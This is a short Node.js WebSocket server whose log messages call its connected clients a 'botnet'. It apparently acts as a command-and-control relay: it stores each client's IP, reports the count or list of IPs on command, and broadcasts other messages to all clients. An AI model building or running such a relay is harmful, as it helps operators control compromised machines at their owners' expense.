const WebSocket = require('ws');
const wss = new WebSocket.Server({ host: '0.0.0.0', port: 8080 });

let clients = new Map();

wss.on('connection', (ws) => {
  const clientIP = ws._socket.remoteAddress;
  clients.set(ws, clientIP);  // Store client IP
  console.log(`Client connected: ${clientIP}`);

  ws.on('message', (message) => {
    console.log(`Received: ${message}`);
    
    if (message === 'getconscount') {
      ws.send(`${clients.size}`);
      console.log('Sent size of botnet');
    } else if (message === 'getconsips') {
      const ips = [...clients.values()].join('|');  // Join IPs with "|"
      ws.send(ips);
      console.log('Sent IPs of botnet');
    } else {
      // Broadcast message to all other clients
      clients.forEach((client, clientSocket) => {
        if (clientSocket !== ws) {
          clientSocket.send(message);
        }
      });
    }
  });

  ws.on('close', () => {
    clients.delete(ws);
    console.log(`Client disconnected: ${clientIP}`);
  });
});

console.log('WebSocket server running on ws://0.0.0.0:8080');
